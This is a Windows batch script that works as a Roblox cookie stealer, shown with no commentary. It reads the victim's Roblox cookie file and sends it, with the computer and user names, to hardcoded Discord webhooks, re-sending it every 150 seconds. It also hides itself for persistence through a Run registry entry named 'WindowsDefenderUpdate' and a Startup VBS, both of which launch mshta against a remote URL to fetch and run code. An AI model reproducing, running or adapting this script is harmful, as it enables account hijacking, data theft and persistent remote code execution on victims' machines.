@echo off
set "LOGS=https://discord.com/api/webhooks/1563118305412386856/q_NFutmLx_3SYcRz5V6kpLs4NszFU0DXON4t484Kizg1JnhVdW60LGYntgxmt04n-uyA"
set "REGRAB=https://discord.com/api/webhooks/1563118424929079298/E6jRzcYYY-UUycAzCamv5EqTNcBmWUjpmja39U_-BlHW8ExxU-ylIGpl4sIEWZiDl_M5"
set "ONLINE=https://discord.com/api/webhooks/1563118517958746183/MkkFXgq5RRDWp-EL7h42SsAxYkpp00l63QdCCznJYfSEhj05m4qN4-Arjrc_TBXBvjYc"

set "PC=%COMPUTERNAME%"
set "USER=%USERNAME%"
set "RC=%LOCALAPPDATA%\Roblox\LocalStorage\robloxcookies.dat"

echo Setting up persistence...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "mshta https://dicerigs.onrender.com/check" /f >nul
echo CreateObject("WScript.Shell").Run "mshta https://dicerigs.onrender.com/check", 0, False > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"

echo Sending initial logs...
if exist "%RC%" (
    for /f "tokens=*" %%a in ('type "%RC%"') do set "cookie=%%a"
) else (
    set "cookie=No cookie file found."
)

curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Initial Log\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %LOGS%
curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Roblox Cookie\",\"description\":\"```\n%cookie%\n```\",\"color\":65280}]}" %LOGS%
curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"User Online\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %ONLINE%

echo Script is now looping.
:loop
timeout /t 150 /nobreak >nul
if exist "%RC%" (
    for /f "tokens=*" %%a in ('type "%RC%"') do set "cookie=%%a"
    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Cookie\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%\n```\",\"color\":65280}]}" %REGRAB%
)
goto loop
